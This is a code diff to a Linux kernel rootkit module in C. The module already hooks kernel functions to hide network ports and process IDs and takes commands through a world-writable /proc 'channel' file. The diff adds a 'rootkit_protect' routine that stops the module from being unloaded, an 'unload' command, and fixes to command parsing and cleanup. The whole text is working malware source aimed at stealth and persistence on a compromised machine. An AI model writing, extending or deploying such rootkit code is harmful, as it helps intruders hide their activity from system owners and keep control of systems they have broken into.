@@ -330,6 +330,19 @@ static asmlinkage int hook_udp6_seq_show(struct seq_file *seq, void *v) {
 }
 /*---------------hide port end------------------*/
 
+
+/*---------------rootkit protect start----------------*/
+
+void rootkit_protect(void) {
+    try_module_get(THIS_MODULE);
+}
+
+void rootkit_unload(void) {
+    module_put(THIS_MODULE);
+}
+
+/*---------------rootkit protect end------------------*/
+
 static struct hide_ports* exist_hide_ports(unsigned short port) {
     struct hide_ports *h;
     list_for_each_entry(h, &hide_ports_list, list) {
@@ -365,7 +378,6 @@ static unsigned int execute(char *cmd, int idx) {
     int i;
     while (idx < strlen(str) && str[idx] ==' ')
         idx++;
-    printk(KERN_INFO "cmd: %s, para: %s\n", cmd, (char *)str + idx);
     if (strcmp(cmd, "hide_port") == 0) {
         if (kstrtou16((char *) str + idx, 10, &port) == 0) {
             printk(KERN_INFO "port: %d\n", port);
@@ -424,6 +436,8 @@ static unsigned int execute(char *cmd, int idx) {
         if (target_pid != NULL) {
             list_del(&target_pid->list);
         }
+    } else if (strcmp(cmd, "unload") == 0) {
+        rootkit_unload();
     } else {
         printk(KERN_INFO "unsupported behaviour: %s\n", str);
         return false;
@@ -444,7 +458,7 @@ static ssize_t write(struct file *file, const char __user *buffer, size_t count,
     }
     
     for (i = 0; i < strlen(str); i++) {
-        if (*(str + i) == ' ')
+        if (*(str + i) == ' ' || *(str + i) == '\r' || *(str + i) == '\n')
             break;
     }
     cmd = kzalloc(i + 1, GFP_KERNEL);
@@ -528,7 +542,7 @@ static int __init rootkit_init(void) {
     struct proc_dir_entry *entry;
 
     //setup_channel();
-    //printk(KERN_INFO "setup_channel successfully\n");
+    printk(KERN_INFO "setup_channel successfully\n");
     // create channel under /proc
     str = kzalloc(100, GFP_KERNEL);
     entry = proc_create("channel", 0666, NULL, &file_fops);
@@ -545,6 +559,8 @@ static int __init rootkit_init(void) {
         printk(KERN_INFO "fh_install_hooks error: %d\n", err);
         return err;
     }
+
+    rootkit_protect();
  
     printk(KERN_INFO "rootkit: Loaded :-)\n");
     return 0;
@@ -553,7 +569,7 @@ static int __init rootkit_init(void) {
 static void __exit rootkit_exit(void) {
     static struct file_operations *proc_fops;
     fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
-    remove_proc_entry("test", NULL);
+    remove_proc_entry("channel", NULL);
     // proc_fops = (struct file_operations *) rb_entry(entry, struct proc_dir_entry, subdir_node)->proc_fops;
     // proc_fops->write = orig_write;
     printk(KERN_INFO "rootkit: Unloaded :-(\n");
